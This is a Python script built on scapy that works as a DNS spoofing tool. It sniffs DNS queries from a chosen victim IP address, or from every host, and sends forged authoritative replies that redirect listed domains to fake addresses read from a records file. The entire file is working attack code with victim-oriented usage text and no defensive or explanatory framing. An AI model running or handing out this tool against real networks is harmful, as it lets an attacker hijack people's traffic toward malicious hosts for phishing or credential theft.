#!/usr/bin/python3

import os
import sys
import re 
import socket

colors = {'HEADER' : "\033[95m",
    'OKBLUE' : "\033[94m",
    'RED' : "\033[91m",
    'OKYELLOW' : "\033[93m",
    'GREEN' : "\033[92m",
    'LIGHTBLUE' : "\033[96m",
    'WARNING' : "\033[93m",
    'FAIL' : "\033[91m",
    'ENDC' : "\033[0m",
    'BOLD' : "\033[1m",
    'UNDERLINE' : "\033[4m" }

def menu():
    print ("-----------------------------------------")
    
menu()

def valid_ip(address):
    try: 
        socket.inet_aton(address)
        return True
    except:
        return False


def check_local_ip():
    local_ip = os.popen("ip route | grep 'src' | awk {'print $9'}").read().strip()
    while True:
        if(valid_ip(local_ip)): break
        else: local_ip = input(colors['WARNING']+"    [!] Cannot get your local IP address, please write it: "+colors['ENDC']).strip()
    return local_ip

local_ip = check_local_ip()


if len(sys.argv) != 3:
    print ('    [i] Usage <victim_ip> <records_file>')
    sys.exit(1)
else:
    victim_ip = sys.argv[1]
    path = sys.argv[2]

sniff_filter = 'udp dst port 53'
registers = {}


def valid_args():
    all_pkt = False
    if(not valid_ip(victim_ip)):
        if(victim_ip != 'all'):
            print (colors['FAIL']+'    [!] Invalid victim\'s IP address'+colors['ENDC'])
            sys.exit(1)
        else:
            all_pkt = True
    return all_pkt

all_pkt = valid_args();


def read_file(path):
    if(os.path.isfile(path) and os.stat(path).st_size > 0 ):
        file = open(path,"r")
        for line in file:
            if(line not in ['\n', '\r\n']):
                try:
                    key,value = line.split()
                    registers[key] = value
                    if (not valid_ip(value)):
                        print(colors['WARNING']+"    [!] Detected an invalid IP address in the file ["+value+"]"+colors['ENDC'])
                        sys.exit(1)
                except:
                    print(colors['FAIL']+"    [!] Invalid file format: <domain> <fake_address>"+colors['ENDC'])
                    sys.exit(1)
        file.close()
    else:
        print(colors['FAIL']+"    [!] The file doesn't exists or is empty"+colors['ENDC'])
        sys.exit(1)

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def check_victims(pkt):
    if(all_pkt and IP in pkt): result = True
    elif(IP in pkt): result = (pkt[IP].src == victim_ip)
    else: result = False
    return result  


def fake_dns_response(pkt):
    print(pkt)
    result = check_victims(pkt)
    if (result and pkt[IP].src != local_ip and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2] in registers):
        cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
        fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]) / DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]))
        send(fakeResponse, verbose=0)
        print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+pkt[IP].src+"]"+colors['WARNING']+": Redirecting "+colors['ENDC']+"["+cap_domain+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+registers[cap_domain]+"]")

def main():
    read_file(path)
    print('    [i] Spoofing DNS responses...')
    sniff(prn=fake_dns_response, filter=sniff_filter, store=0)

if __name__ == "__main__":
    main()
